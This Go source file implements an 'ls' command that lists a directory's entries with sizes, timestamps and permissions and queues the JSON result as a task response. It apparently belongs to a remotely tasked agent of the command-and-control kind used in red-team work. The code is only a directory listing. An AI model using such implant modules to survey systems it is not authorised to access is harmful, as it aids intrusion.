package ls

import (
	"encoding/json"
	"io/ioutil"

	"pkg/utils/structs"
	"sync"
	"pkg/profiles"
)

var mu sync.Mutex

type DirectoryEntries struct {
	Entries []FileData `json:"entries"`
}

type FileData struct {
	Filename     string `json:"Filename"`
	FileSize     int64  `json:"Size"`
	LastModified string `json:"Lastmodified"`
	Directory    bool   `json:"IsDir"`
	Permissions  string `json:"Permissions"`
}

func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	if len(task.Params) == 0 {
		task.Params = "."
	}
	files, err := ioutil.ReadDir(task.Params)

	
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}

	fileEntries := make([]FileData, len(files))

	for i := 0; i < len(files); i++ {
		fileEntries[i].Filename = files[i].Name()
		fileEntries[i].Directory = files[i].IsDir()
		fileEntries[i].FileSize = files[i].Size()
		fileEntries[i].LastModified = files[i].ModTime().String()
		fileEntries[i].Permissions = files[i].Mode().Perm().String()
	}

	var e DirectoryEntries
	e.Entries = fileEntries

	data, err := json.MarshalIndent(e, "", "	")

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}
    msg.Completed = true
	msg.UserOutput = string(data)
	resp, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, resp)
	mu.Unlock()
	return
}
